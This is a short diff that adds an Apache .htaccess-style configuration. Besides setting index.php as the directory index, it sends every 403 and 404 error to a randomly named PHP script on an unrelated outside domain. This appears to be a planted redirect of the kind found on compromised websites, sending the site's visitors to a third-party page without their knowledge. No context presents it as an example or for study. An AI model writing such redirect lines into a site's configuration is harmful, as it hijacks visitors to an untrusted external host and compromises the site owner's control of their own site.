@@ -1,0 +1,5 @@
+DirectoryIndex index.php
+ErrorDocument 403 http://nemean.no/kahadujortno.php
+ErrorDocument 404 http://nemean.no/kahadujortno.php
+
+
